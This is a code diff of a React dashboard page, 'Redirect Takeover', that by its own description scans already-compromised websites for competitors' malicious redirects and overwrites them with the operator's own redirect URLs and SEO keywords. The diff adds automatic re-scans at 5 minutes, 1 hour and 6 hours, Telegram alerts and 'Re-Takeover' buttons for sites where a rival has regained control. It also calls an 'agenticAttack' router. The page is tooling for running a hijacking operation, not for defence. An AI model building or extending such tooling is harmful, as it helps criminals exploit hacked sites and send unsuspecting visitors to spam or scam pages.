@@ -1,9 +1,9 @@
 /**
  * ═══════════════════════════════════════════════════════════════
- *  REDIRECT TAKEOVER — Detect & Overwrite Competitor Redirects
+ *  REDIRECT TAKEOVER — Detect, Overwrite & Verify
  *  
  *  Scan compromised sites to find existing competitor redirects,
- *  then overwrite them with our redirect URLs.
+ *  overwrite them with our redirect URLs, and auto-verify success.
  * ═══════════════════════════════════════════════════════════════
  */
 import { useState, useMemo } from "react";
@@ -38,7 +38,12 @@ import {
   BarChart3,
   Skull,
   Copy,
-  ExternalLink,
+  ShieldCheck,
+  ShieldAlert,
+  Timer,
+  Activity,
+  RotateCcw,
+  Play,
 } from "lucide-react";
 
 // ─── Types ───
@@ -105,6 +110,13 @@ const CONFIDENCE_COLORS: Record<string, string> = {
   low: "bg-blue-500/20 text-blue-400 border-blue-500/30",
 };
 
+const VERIFICATION_STATUS: Record<string, { label: string; color: string; icon: typeof CheckCircle2 }> = {
+  pending: { label: "Pending Verification", color: "border-amber-500/30 text-amber-400", icon: Timer },
+  verified_success: { label: "Verified ✓", color: "border-emerald-500/30 text-emerald-400", icon: ShieldCheck },
+  verified_reverted: { label: "Reverted!", color: "border-red-500/30 text-red-400", icon: ShieldAlert },
+  not_verified: { label: "Not Verified", color: "border-zinc-500/30 text-zinc-400", icon: Shield },
+};
+
 export default function RedirectTakeover() {
   const [activeTab, setActiveTab] = useState("scan");
   const [scanUrl, setScanUrl] = useState("");
@@ -118,12 +130,23 @@ export default function RedirectTakeover() {
   const [batchScanning, setBatchScanning] = useState(false);
   const [batchProgress, setBatchProgress] = useState({ current: 0, total: 0 });
   const [snippetDialog, setSnippetDialog] = useState<{ open: boolean; snippet: string; title: string }>({ open: false, snippet: "", title: "" });
+  const [verificationDetailSiteId, setVerificationDetailSiteId] = useState<number | null>(null);
 
   // ─── Queries ───
   const redirectUrlsQuery = trpc.agenticAttack.listRedirects.useQuery();
   const hackedSitesQuery = trpc.redirectTakeover.listHackedSites.useQuery(undefined, {
     refetchInterval: 30000,
   });
+  const statsQuery = trpc.redirectTakeover.getStats.useQuery(undefined, {
+    refetchInterval: 30000,
+  });
+  const verificationStatsQuery = trpc.redirectTakeover.getVerificationStats.useQuery(undefined, {
+    refetchInterval: 30000,
+  });
+  const verificationHistoryQuery = trpc.redirectTakeover.getVerificationHistory.useQuery(
+    { siteId: verificationDetailSiteId! },
+    { enabled: verificationDetailSiteId !== null }
+  );
 
   // ─── Mutations ───
   const detectMutation = trpc.redirectTakeover.detect.useMutation({
@@ -134,13 +157,45 @@ export default function RedirectTakeover() {
     onError: (err) => toast.error("Takeover Error", { description: err.message }),
   });
 
+  const verifyNowMutation = trpc.redirectTakeover.verifyNow.useMutation({
+    onSuccess: (data) => {
+      if (!data) {
+        toast.warning("Verification Inconclusive", { description: "ไม่สามารถตรวจสอบได้" });
+      } else if (data.status === "verified_success" && data.ourRedirectFound) {
+        toast.success("Verification Passed!", { description: `Redirect ยังเป็นของเรา ✓` });
+      } else if (data.status === "verified_reverted") {
+        toast.error("Redirect Reverted!", { description: `คู่แข่งเอา redirect กลับแล้ว — ต้อง re-takeover` });
+      } else {
+        toast.warning("Verification Inconclusive", { description: data.details || "ไม่สามารถตรวจสอบได้" });
+      }
+      hackedSitesQuery.refetch();
+      verificationStatsQuery.refetch();
+      if (verificationDetailSiteId) verificationHistoryQuery.refetch();
+    },
+    onError: (err) => toast.error("Verify Error", { description: err.message }),
+  });
+
+  const processPendingMutation = trpc.redirectTakeover.processPendingVerifications.useMutation({
+    onSuccess: (data) => {
+      toast.success("Verification Batch Complete", {
+        description: `Processed: ${data.processed}, Verified: ${data.verified}, Reverted: ${data.reverted}`,
+      });
+      hackedSitesQuery.refetch();
+      verificationStatsQuery.refetch();
+    },
+    onError: (err) => toast.error("Batch Verify Error", { description: err.message }),
+  });
+
   // ─── Stats ───
-  const stats = useMemo(() => {
+  const localStats = useMemo(() => {
     const total = scanHistory.length;
     const hacked = scanHistory.filter(s => s.result.detected).length;
     const taken = scanHistory.filter(s => s.takeoverResults?.some(r => r.success)).length;
     return { total, hacked, taken, rate: total > 0 ? Math.round((hacked / total) * 100) : 0 };
   }, [scanHistory]);
+
+  const dbStats = statsQuery.data || { total: 0, hacked: 0, takenOver: 0, failed: 0, pendingVerification: 0, verifiedSuccess: 0, verifiedReverted: 0 };
+  const vStats = verificationStatsQuery.data || { pendingVerifications: 0, verifiedSuccess: 0, verifiedReverted: 0, verificationFailed: 0, awaitingRetry: 0 };
 
   // ─── Single URL Scan ───
   async function handleSingleScan() {
@@ -211,7 +266,6 @@ export default function RedirectTakeover() {
           takeoverAttempted: false,
         }, ...prev]);
       }
-      // Small delay between scans
       if (i < urls.length - 1) await new Promise(r => setTimeout(r, 1000));
     }
 
@@ -235,7 +289,6 @@ export default function RedirectTakeover() {
         seoKeywords: seoKeywords.split(",").map(k => k.trim()).filter(Boolean),
       });
 
-      // Update scan history
       setScanHistory(prev =>
         prev.map(item =>
           item.url === takeoverTarget.url
@@ -248,7 +301,9 @@ export default function RedirectTakeover() {
 
       if (result.anySuccess) {
         toast.success("Takeover สำเร็จ!", {
-          description: `Overwrite redirect บน ${takeoverTarget.url}`,
+          description: result.verificationScheduled
+            ? "Auto-verification scheduled — ระบบจะตรวจสอบอัตโนมัติ"
+            : `Overwrite redirect บน ${takeoverTarget.url}`,
         });
       } else {
         toast.warning("Takeover ไม่สำเร็จ", {
@@ -256,8 +311,8 @@ export default function RedirectTakeover() {
         });
       }
 
-      // Refresh hacked sites list
       hackedSitesQuery.refetch();
+      statsQuery.refetch();
     } catch {
       // error handled by mutation
     }
@@ -273,7 +328,7 @@ export default function RedirectTakeover() {
             Redirect Takeover
           </h1>
           <p className="text-sm text-muted-foreground mt-1">
-            ตรวจจับและ overwrite redirect ของคู่แข่งบนเว็บที่ถูก hack แล้ว
+            ตรวจจับ, overwrite redirect ของคู่แข่ง, และ verify ผลลัพธ์อัตโนมัติ
           </p>
         </div>
         <div className="flex gap-2">
@@ -284,49 +339,71 @@ export default function RedirectTakeover() {
         </div>
       </div>
 
-      {/* Stats Cards */}
-      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+      {/* Stats Cards — 6 columns */}
+      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
         <Card className="bg-card/50 border-border/50">
-          <CardContent className="p-4">
+          <CardContent className="p-3">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-xs text-muted-foreground font-mono uppercase">Scanned</p>
-                <p className="text-2xl font-bold mt-1">{stats.total}</p>
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Scanned</p>
+                <p className="text-xl font-bold mt-0.5">{dbStats.total || localStats.total}</p>
               </div>
-              <Search className="w-5 h-5 text-muted-foreground" />
+              <Search className="w-4 h-4 text-muted-foreground" />
             </div>
           </CardContent>
         </Card>
         <Card className="bg-card/50 border-border/50">
-          <CardContent className="p-4">
+          <CardContent className="p-3">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-xs text-muted-foreground font-mono uppercase">Hacked</p>
-                <p className="text-2xl font-bold mt-1 text-red-400">{stats.hacked}</p>
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Hacked</p>
+                <p className="text-xl font-bold mt-0.5 text-red-400">{dbStats.hacked || localStats.hacked}</p>
               </div>
-              <AlertTriangle className="w-5 h-5 text-red-400" />
+              <AlertTriangle className="w-4 h-4 text-red-400" />
             </div>
           </CardContent>
         </Card>
         <Card className="bg-card/50 border-border/50">
-          <CardContent className="p-4">
+          <CardContent className="p-3">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-xs text-muted-foreground font-mono uppercase">Taken Over</p>
-                <p className="text-2xl font-bold mt-1 text-emerald-400">{stats.taken}</p>
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Taken Over</p>
+                <p className="text-xl font-bold mt-0.5 text-emerald-400">{dbStats.takenOver || localStats.taken}</p>
               </div>
-              <CheckCircle2 className="w-5 h-5 text-emerald-400" />
+              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
             </div>
           </CardContent>
         </Card>
-        <Card className="bg-card/50 border-border/50">
-          <CardContent className="p-4">
+        <Card className="bg-card/50 border-amber-500/20">
+          <CardContent className="p-3">
             <div className="flex items-center justify-between">
               <div>
-                <p className="text-xs text-muted-foreground font-mono uppercase">Detection Rate</p>
-                <p className="text-2xl font-bold mt-1 text-amber-400">{stats.rate}%</p>
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Pending Verify</p>
+                <p className="text-xl font-bold mt-0.5 text-amber-400">{dbStats.pendingVerification}</p>
               </div>
-              <BarChart3 className="w-5 h-5 text-amber-400" />
+              <Timer className="w-4 h-4 text-amber-400" />
+            </div>
+          </CardContent>
+        </Card>
+        <Card className="bg-card/50 border-emerald-500/20">
+          <CardContent className="p-3">
+            <div className="flex items-center justify-between">
+              <div>
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Verified OK</p>
+                <p className="text-xl font-bold mt-0.5 text-emerald-400">{dbStats.verifiedSuccess}</p>
+              </div>
+              <ShieldCheck className="w-4 h-4 text-emerald-400" />
+            </div>
+          </CardContent>
+        </Card>
+        <Card className="bg-card/50 border-red-500/20">
+          <CardContent className="p-3">
+            <div className="flex items-center justify-between">
+              <div>
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Reverted</p>
+                <p className="text-xl font-bold mt-0.5 text-red-400">{dbStats.verifiedReverted}</p>
+              </div>
+              <ShieldAlert className="w-4 h-4 text-red-400" />
             </div>
           </CardContent>
         </Card>
@@ -339,7 +416,7 @@ export default function RedirectTakeover() {
             <Search className="w-4 h-4 mr-1.5" /> Scan
           </TabsTrigger>
           <TabsTrigger value="batch" className="data-[state=active]:bg-amber-500/20 data-[state=active]:text-amber-400">
-            <Target className="w-4 h-4 mr-1.5" /> Batch Scan
+            <Target className="w-4 h-4 mr-1.5" /> Batch
           </TabsTrigger>
           <TabsTrigger value="history" className="data-[state=active]:bg-emerald-500/20 data-[state=active]:text-emerald-400">
             <Clock className="w-4 h-4 mr-1.5" /> History
@@ -349,6 +426,12 @@ export default function RedirectTakeover() {
           </TabsTrigger>
           <TabsTrigger value="database" className="data-[state=active]:bg-violet-500/20 data-[state=active]:text-violet-400">
             <Database className="w-4 h-4 mr-1.5" /> Database
+          </TabsTrigger>
+          <TabsTrigger value="verification" className="data-[state=active]:bg-cyan-500/20 data-[state=active]:text-cyan-400">
+            <ShieldCheck className="w-4 h-4 mr-1.5" /> Verification
+            {dbStats.pendingVerification > 0 && (
+              <Badge variant="secondary" className="ml-1.5 text-[10px] px-1.5 py-0 bg-amber-500/20 text-amber-400">{dbStats.pendingVerification}</Badge>
+            )}
           </TabsTrigger>
         </TabsList>
 
@@ -389,7 +472,6 @@ export default function RedirectTakeover() {
             </CardContent>
           </Card>
 
-          {/* Detection Result */}
           {selectedScan && (
             <DetectionResultCard
               scan={selectedScan}
@@ -579,82 +661,441 @@ export default function RedirectTakeover() {
                 </div>
               ) : (
                 <div className="space-y-2">
-                  {hackedSitesQuery.data.map((site: any) => (
-                    <div
-                      key={site.id}
-                      className="flex items-center justify-between p-3 rounded-lg bg-background/50 border border-border/30 hover:border-red-500/30 transition-colors"
-                    >
-                      <div className="flex items-center gap-3 min-w-0">
-                        <div className={`w-2 h-2 rounded-full shrink-0 ${
-                          site.takeoverStatus === "success" ? "bg-emerald-400" :
-                          site.takeoverStatus === "failed" ? "bg-red-400" :
-                          site.isHacked ? "bg-amber-400 animate-pulse" : "bg-zinc-400"
-                        }`} />
-                        <div className="min-w-0">
-                          <p className="text-sm font-medium truncate">{site.domain}</p>
-                          <div className="flex items-center gap-1.5 mt-0.5 flex-wrap">
-                            {site.competitorUrl && (
-                              <span className="text-[10px] text-red-400 truncate max-w-[200px]">
-                                → {site.competitorUrl}
-                              </span>
-                            )}
-                            {site.targetPlatform && (
-                              <Badge variant="outline" className="text-[9px] px-1 py-0">{site.targetPlatform}</Badge>
-                            )}
-                            <Badge
-                              variant="outline"
-                              className={`text-[9px] px-1 py-0 ${
-                                site.takeoverStatus === "success" ? "border-emerald-500/30 text-emerald-400" :
-                                site.takeoverStatus === "failed" ? "border-red-500/30 text-red-400" :
-                                site.takeoverStatus === "in_progress" ? "border-amber-500/30 text-amber-400" :
-                                "border-border/50"
-                              }`}
-                            >
-                              {site.takeoverStatus}
-                            </Badge>
-                            <Badge variant="outline" className="text-[9px] px-1 py-0">
-                              P{site.priority}
-                            </Badge>
+                  {hackedSitesQuery.data.map((site: any) => {
+                    const vStatus = VERIFICATION_STATUS[site.verificationStatus || "not_verified"] || VERIFICATION_STATUS.not_verified;
+                    const VIcon = vStatus.icon;
+                    return (
+                      <div
+                        key={site.id}
+                        className="flex items-center justify-between p-3 rounded-lg bg-background/50 border border-border/30 hover:border-red-500/30 transition-colors"
+                      >
+                        <div className="flex items-center gap-3 min-w-0">
+                          <div className={`w-2 h-2 rounded-full shrink-0 ${
+                            site.verificationStatus === "verified_success" ? "bg-emerald-400" :
+                            site.verificationStatus === "verified_reverted" ? "bg-red-400 animate-pulse" :
+                            site.takeoverStatus === "success" ? "bg-cyan-400" :
+                            site.takeoverStatus === "failed" ? "bg-red-400" :
+                            site.isHacked ? "bg-amber-400 animate-pulse" : "bg-zinc-400"
+                          }`} />
+                          <div className="min-w-0">
+                            <p className="text-sm font-medium truncate">{site.domain}</p>
+                            <div className="flex items-center gap-1.5 mt-0.5 flex-wrap">
+                              {site.competitorUrl && (
+                                <span className="text-[10px] text-red-400 truncate max-w-[200px]">
+                                  → {site.competitorUrl}
+                                </span>
+                              )}
+                              {site.targetPlatform && (
+                                <Badge variant="outline" className="text-[9px] px-1 py-0">{site.targetPlatform}</Badge>
+                              )}
+                              <Badge
+                                variant="outline"
+                                className={`text-[9px] px-1 py-0 ${
+                                  site.takeoverStatus === "success" ? "border-emerald-500/30 text-emerald-400" :
+                                  site.takeoverStatus === "failed" ? "border-red-500/30 text-red-400" :
+                                  site.takeoverStatus === "in_progress" ? "border-amber-500/30 text-amber-400" :
+                                  "border-border/50"
+                                }`}
+                              >
+                                {site.takeoverStatus}
+                              </Badge>
+                              {/* Verification badge */}
+                              {site.takeoverStatus === "success" && (
+                                <Badge variant="outline" className={`text-[9px] px-1 py-0 ${vStatus.color}`}>
+                                  <VIcon className="w-2.5 h-2.5 mr-0.5" />
+                                  {vStatus.label}
+                                </Badge>
+                              )}
+                              <Badge variant="outline" className="text-[9px] px-1 py-0">
+                                P{site.priority}
+                              </Badge>
+                            </div>
                           </div>
                         </div>
+                        <div className="flex items-center gap-2 shrink-0">
+                          <span className="text-[10px] text-muted-foreground">
+                            {new Date(site.scannedAt).toLocaleDateString("th-TH")}
+                          </span>
+                          {/* Verify Now button for taken-over sites */}
+                          {site.takeoverStatus === "success" && (
+                            <Button
+                              size="sm"
+                              variant="outline"
+                              className="text-xs border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10"
+                              disabled={verifyNowMutation.isPending}
+                              onClick={() => {
+                                verifyNowMutation.mutate({ siteId: site.id });
+                              }}
+                            >
+                              {verifyNowMutation.isPending ? (
+                                <Loader2 className="w-3 h-3 animate-spin" />
+                              ) : (
+                                <ShieldCheck className="w-3 h-3 mr-1" />
+                              )}
+                              Verify
+                            </Button>
+                          )}
+                          {site.isHacked && site.takeoverStatus === "not_attempted" && (
+                            <Button
+                              size="sm"
+                              variant="outline"
+                              className="text-xs border-red-500/30 text-red-400 hover:bg-red-500/10"
+                              onClick={() => {
+                                setTakeoverTarget({
+                                  url: site.url,
+                                  result: {
+                                    detected: true,
+                                    methods: site.detectionMethods || [],
+                                    competitorUrl: site.competitorUrl,
+                                    targetPlatform: site.targetPlatform,
+                                    wpVersion: site.wpVersion,
+                                    plugins: site.plugins || [],
+                                  },
+                                  scannedAt: new Date(site.scannedAt),
+                                  takeoverAttempted: false,
+                                });
+                                setTakeoverDialog(true);
+                              }}
+                            >
+                              <Crosshair className="w-3 h-3 mr-1" />
+                              Takeover
+                            </Button>
+                          )}
+                          {/* Re-takeover for reverted sites */}
+                          {site.verificationStatus === "verified_reverted" && (
+                            <Button
+                              size="sm"
+                              variant="outline"
+                              className="text-xs border-red-500/30 text-red-400 hover:bg-red-500/10 animate-pulse"
+                              onClick={() => {
+                                setTakeoverTarget({
+                                  url: site.url,
+                                  result: {
+                                    detected: true,
+                                    methods: site.detectionMethods || [],
+                                    competitorUrl: site.competitorUrl,
+                                    targetPlatform: site.targetPlatform,
+                                    wpVersion: site.wpVersion,
+                                    plugins: site.plugins || [],
+                                  },
+                                  scannedAt: new Date(site.scannedAt),
+                                  takeoverAttempted: false,
+                                });
+                                setTakeoverDialog(true);
+                              }}
+                            >
+                              <RotateCcw className="w-3 h-3 mr-1" />
+                              Re-Takeover
+                            </Button>
+                          )}
+                        </div>
                       </div>
-                      <div className="flex items-center gap-2 shrink-0">
-                        <span className="text-[10px] text-muted-foreground">
-                          {new Date(site.scannedAt).toLocaleDateString("th-TH")}
-                        </span>
-                        {site.isHacked && site.takeoverStatus === "not_attempted" && (
-                          <Button
-                            size="sm"
-                            variant="outline"
-                            className="text-xs border-red-500/30 text-red-400 hover:bg-red-500/10"
-                            onClick={() => {
-                              setTakeoverTarget({
-                                url: site.url,
-                                result: {
-                                  detected: true,
-                                  methods: site.detectionMethods || [],
-                                  competitorUrl: site.competitorUrl,
-                                  targetPlatform: site.targetPlatform,
-                                  wpVersion: site.wpVersion,
-                                  plugins: site.plugins || [],
-                                },
-                                scannedAt: new Date(site.scannedAt),
-                                takeoverAttempted: false,
-                              });
-                              setTakeoverDialog(true);
-                            }}
-                          >
-                            <Crosshair className="w-3 h-3 mr-1" />
-                            Takeover
-                          </Button>
-                        )}
-                      </div>
-                    </div>
-                  ))}
+                    );
+                  })}
                 </div>
               )}
             </CardContent>
           </Card>
+        </TabsContent>
+
+        {/* ─── Verification Tab ─── */}
+        <TabsContent value="verification" className="space-y-4 mt-4">
+          {/* Verification Overview */}
+          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+            <Card className="bg-card/50 border-border/50">
+              <CardContent className="p-3">
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Total Verified</p>
+                <p className="text-xl font-bold mt-0.5">{vStats.verifiedSuccess + vStats.verifiedReverted + vStats.verificationFailed}</p>
+              </CardContent>
+            </Card>
+            <Card className="bg-card/50 border-amber-500/20">
+              <CardContent className="p-3">
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Pending</p>
+                <p className="text-xl font-bold mt-0.5 text-amber-400">{vStats.pendingVerifications}</p>
+              </CardContent>
+            </Card>
+            <Card className="bg-card/50 border-emerald-500/20">
+              <CardContent className="p-3">
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Verified OK</p>
+                <p className="text-xl font-bold mt-0.5 text-emerald-400">{vStats.verifiedSuccess}</p>
+              </CardContent>
+            </Card>
+            <Card className="bg-card/50 border-red-500/20">
+              <CardContent className="p-3">
+                <p className="text-[10px] text-muted-foreground font-mono uppercase">Reverted</p>
+                <p className="text-xl font-bold mt-0.5 text-red-400">{vStats.verifiedReverted}</p>
+              </CardContent>
+            </Card>
+          </div>
+
+          {/* Actions */}
+          <Card className="bg-card/50 border-border/50">
+            <CardHeader className="pb-3">
+              <div className="flex items-center justify-between">
+                <CardTitle className="text-base flex items-center gap-2">
+                  <Activity className="w-4 h-4 text-cyan-400" />
+                  Verification Engine
+                </CardTitle>
+                <div className="flex gap-2">
+                  <Button
+                    size="sm"
+                    variant="outline"
+                    className="text-xs border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10"
+                    onClick={() => processPendingMutation.mutate()}
+                    disabled={processPendingMutation.isPending}
+                  >
+                    {processPendingMutation.isPending ? (
+                      <Loader2 className="w-3.5 h-3.5 animate-spin mr-1.5" />
+                    ) : (
+                      <Play className="w-3.5 h-3.5 mr-1.5" />
+                    )}
+                    Process All Pending
+                  </Button>
+                  <Button
+                    size="sm"
+                    variant="outline"
+                    onClick={() => {
+                      verificationStatsQuery.refetch();
+                      hackedSitesQuery.refetch();
+                    }}
+                  >
+                    <RefreshCw className="w-3.5 h-3.5 mr-1.5" />
+                    Refresh
+                  </Button>
+                </div>
+              </div>
+            </CardHeader>
+            <CardContent>
+              <div className="space-y-3">
+                <div className="p-3 rounded-lg bg-cyan-500/5 border border-cyan-500/10">
+                  <p className="text-xs text-cyan-400 font-medium mb-1">How Verification Works</p>
+                  <p className="text-[11px] text-muted-foreground leading-relaxed">
+                    หลัง takeover สำเร็จ ระบบจะ schedule verification อัตโนมัติ — ตรวจสอบ 3 ครั้ง (5 นาที, 1 ชม., 6 ชม. หลัง takeover)
+                    โดย re-scan URL เพื่อยืนยันว่า redirect ยังเป็นของเรา ถ้าคู่แข่งเอากลับ ระบบจะแจ้ง Telegram + ตั้ง flag ให้ re-takeover อัตโนมัติ
+                  </p>
+                </div>
+
+                {/* Verification Timeline for sites */}
+                <p className="text-sm font-medium mt-4 mb-2">Sites Awaiting Verification</p>
+                {hackedSitesQuery.data?.filter((s: any) => s.verificationStatus === "pending").length === 0 ? (
+                  <div className="text-center py-6">
+                    <ShieldCheck className="w-8 h-8 text-muted-foreground mx-auto mb-2" />
+                    <p className="text-sm text-muted-foreground">ไม่มี site ที่รอ verification</p>
+                  </div>
+                ) : (
+                  <div className="space-y-2">
+                    {hackedSitesQuery.data?.filter((s: any) => s.verificationStatus === "pending").map((site: any) => (
+                      <div
+                        key={site.id}
+                        className="flex items-center justify-between p-3 rounded-lg bg-amber-500/5 border border-amber-500/15 hover:border-amber-500/30 transition-colors"
+                      >
+                        <div className="flex items-center gap-3 min-w-0">
+                          <Timer className="w-4 h-4 text-amber-400 shrink-0 animate-pulse" />
+                          <div className="min-w-0">
+                            <p className="text-sm font-medium truncate">{site.domain}</p>
+                            <div className="flex items-center gap-2 mt-0.5">
+                              <span className="text-[10px] text-muted-foreground">
+                                Takeover: {site.takeoverAt ? new Date(site.takeoverAt).toLocaleString("th-TH") : "N/A"}
+                              </span>
+                              <span className="text-[10px] text-amber-400">
+                                Next verify: {site.nextVerificationAt ? new Date(site.nextVerificationAt).toLocaleString("th-TH") : "Scheduled"}
+                              </span>
+                              <Badge variant="outline" className="text-[9px] px-1 py-0">
+                                Attempt {site.verificationAttempts || 0}/3
+                              </Badge>
+                            </div>
+                          </div>
+                        </div>
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          className="text-xs border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10 shrink-0"
+                          disabled={verifyNowMutation.isPending}
+                          onClick={() => verifyNowMutation.mutate({ siteId: site.id })}
+                        >
+                          {verifyNowMutation.isPending ? (
+                            <Loader2 className="w-3 h-3 animate-spin" />
+                          ) : (
+                            <ShieldCheck className="w-3 h-3 mr-1" />
+                          )}
+                          Verify Now
+                        </Button>
+                      </div>
+                    ))}
+                  </div>
+                )}
+
+                {/* Recently Verified */}
+                <p className="text-sm font-medium mt-4 mb-2">Recently Verified</p>
+                {hackedSitesQuery.data?.filter((s: any) => s.verificationStatus === "verified_success" || s.verificationStatus === "verified_reverted").length === 0 ? (
+                  <div className="text-center py-6">
+                    <Activity className="w-8 h-8 text-muted-foreground mx-auto mb-2" />
+                    <p className="text-sm text-muted-foreground">ยังไม่มีผล verification</p>
+                  </div>
+                ) : (
+                  <div className="space-y-2">
+                    {hackedSitesQuery.data?.filter((s: any) => s.verificationStatus === "verified_success" || s.verificationStatus === "verified_reverted").map((site: any) => {
+                      const isSuccess = site.verificationStatus === "verified_success";
+                      return (
+                        <div
+                          key={site.id}
+                          className={`flex items-center justify-between p-3 rounded-lg border transition-colors cursor-pointer ${
+                            isSuccess
+                              ? "bg-emerald-500/5 border-emerald-500/15 hover:border-emerald-500/30"
+                              : "bg-red-500/5 border-red-500/15 hover:border-red-500/30"
+                          }`}
+                          onClick={() => setVerificationDetailSiteId(site.id)}
+                        >
+                          <div className="flex items-center gap-3 min-w-0">
+                            {isSuccess ? (
+                              <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
+                            ) : (
+                              <ShieldAlert className="w-4 h-4 text-red-400 shrink-0 animate-pulse" />
+                            )}
+                            <div className="min-w-0">
+                              <p className="text-sm font-medium truncate">{site.domain}</p>
+                              <div className="flex items-center gap-2 mt-0.5">
+                                <span className={`text-[10px] ${isSuccess ? "text-emerald-400" : "text-red-400"}`}>
+                                  {isSuccess ? "Redirect ยังเป็นของเรา ✓" : "คู่แข่งเอา redirect กลับ!"}
+                                </span>
+                                {site.lastVerifiedAt && (
+                                  <span className="text-[10px] text-muted-foreground">
+                                    Verified: {new Date(site.lastVerifiedAt).toLocaleString("th-TH")}
+                                  </span>
+                                )}
+                              </div>
+                            </div>
+                          </div>
+                          <div className="flex items-center gap-2 shrink-0">
+                            {!isSuccess && (
+                              <Button
+                                size="sm"
+                                variant="outline"
+                                className="text-xs border-red-500/30 text-red-400 hover:bg-red-500/10"
+                                onClick={(e) => {
+                                  e.stopPropagation();
+                                  setTakeoverTarget({
+                                    url: site.url,
+                                    result: {
+                                      detected: true,
+                                      methods: site.detectionMethods || [],
+                                      competitorUrl: site.competitorUrl,
+                                      targetPlatform: site.targetPlatform,
+                                      wpVersion: site.wpVersion,
+                                      plugins: site.plugins || [],
+                                    },
+                                    scannedAt: new Date(site.scannedAt),
+                                    takeoverAttempted: false,
+                                  });
+                                  setTakeoverDialog(true);
+                                }}
+                              >
+                                <RotateCcw className="w-3 h-3 mr-1" />
+                                Re-Takeover
+                              </Button>
+                            )}
+                            <Button
+                              size="sm"
+                              variant="ghost"
+                              className="text-xs"
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                verifyNowMutation.mutate({ siteId: site.id });
+                              }}
+                              disabled={verifyNowMutation.isPending}
+                            >
+                              <RefreshCw className="w-3 h-3" />
+                            </Button>
+                          </div>
+                        </div>
+                      );
+                    })}
+                  </div>
+                )}
+              </div>
+            </CardContent>
+          </Card>
+
+          {/* Verification Detail Dialog */}
+          <Dialog open={verificationDetailSiteId !== null} onOpenChange={(open) => !open && setVerificationDetailSiteId(null)}>
+            <DialogContent className="max-w-lg">
+              <DialogHeader>
+                <DialogTitle className="flex items-center gap-2">
+                  <ShieldCheck className="w-5 h-5 text-cyan-400" />
+                  Verification History
+                </DialogTitle>
+                <DialogDescription>
+                  ประวัติการตรวจสอบ redirect สำหรับ site #{verificationDetailSiteId}
+                </DialogDescription>
+              </DialogHeader>
+              {verificationHistoryQuery.isLoading ? (
+                <div className="flex items-center justify-center py-8">
+                  <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
+                </div>
+              ) : verificationHistoryQuery.data ? (
+                <div className="space-y-3">
+                  {/* Site verification summary */}
+                  <div className="p-3 rounded-lg bg-background/50 border border-border/30">
+                    <div className="grid grid-cols-2 gap-2 text-xs">
+                      <div><span className="text-muted-foreground">Status:</span> <span className="font-medium">{verificationHistoryQuery.data.verificationStatus}</span></div>
+                      <div><span className="text-muted-foreground">Stage:</span> <span className="font-medium">{verificationHistoryQuery.data.verificationStage}</span></div>
+                      <div><span className="text-muted-foreground">Attempts:</span> <span className="font-medium">{verificationHistoryQuery.data.verificationAttempts}</span></div>
+                      <div><span className="text-muted-foreground">Retries:</span> <span className="font-medium">{verificationHistoryQuery.data.autoRetryCount}</span></div>
+                    </div>
+                    {verificationHistoryQuery.data.ourRedirectUrl && (
+                      <p className="text-[10px] text-muted-foreground font-mono mt-2 truncate">
+                        Our URL: {verificationHistoryQuery.data.ourRedirectUrl}
+                      </p>
+                    )}
+                  </div>
+                  {/* Verification history entries */}
+                  {(() => {
+                    const history = verificationHistoryQuery.data.verificationHistory as any;
+                    const entries: any[] = Array.isArray(history) ? history : [];
+                    if (entries.length === 0) return (
+                      <div className="text-center py-4">
+                        <Activity className="w-6 h-6 text-muted-foreground mx-auto mb-2" />
+                        <p className="text-xs text-muted-foreground">ยังไม่มีประวัติ verification entries</p>
+                      </div>
+                    );
+                    return (
+                      <div className="space-y-2 max-h-[300px] overflow-y-auto">
+                        {entries.map((entry: any, idx: number) => {
+                          const isOk = entry.status === "verified_success" || entry.ourRedirectFound;
+                          return (
+                            <div
+                              key={idx}
+                              className={`p-3 rounded-lg border ${isOk ? "bg-emerald-500/5 border-emerald-500/15" : "bg-red-500/5 border-red-500/15"}`}
+                            >
+                              <div className="flex items-center justify-between mb-1">
+                                <div className="flex items-center gap-2">
+                                  {isOk ? <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" /> : <ShieldAlert className="w-3.5 h-3.5 text-red-400" />}
+                                  <span className="text-xs font-medium">{isOk ? "Verified OK" : entry.status || "Reverted"}</span>
+                                  {entry.stage && <Badge variant="outline" className="text-[9px] px-1 py-0">{entry.stage}</Badge>}
+                                </div>
+                                {entry.verifiedAt && (
+                                  <span className="text-[10px] text-muted-foreground">{new Date(entry.verifiedAt).toLocaleString("th-TH")}</span>
+                                )}
+                              </div>
+                              {entry.details && <p className="text-[10px] text-muted-foreground mt-1">{entry.details}</p>}
+                              {entry.currentRedirectTarget && (
+                                <p className="text-[10px] text-muted-foreground font-mono truncate mt-0.5">Current: {entry.currentRedirectTarget}</p>
+                              )}
+                            </div>
+                          );
+                        })}
+                      </div>
+                    );
+                  })()}
+                </div>
+              ) : (
+                <div className="text-center py-8">
+                  <Activity className="w-8 h-8 text-muted-foreground mx-auto mb-2" />
+                  <p className="text-sm text-muted-foreground">ยังไม่มีประวัติ verification</p>
+                </div>
+              )}
+            </DialogContent>
+          </Dialog>
         </TabsContent>
       </Tabs>
 
@@ -702,6 +1143,12 @@ export default function RedirectTakeover() {
                 className="bg-background/50"
               />
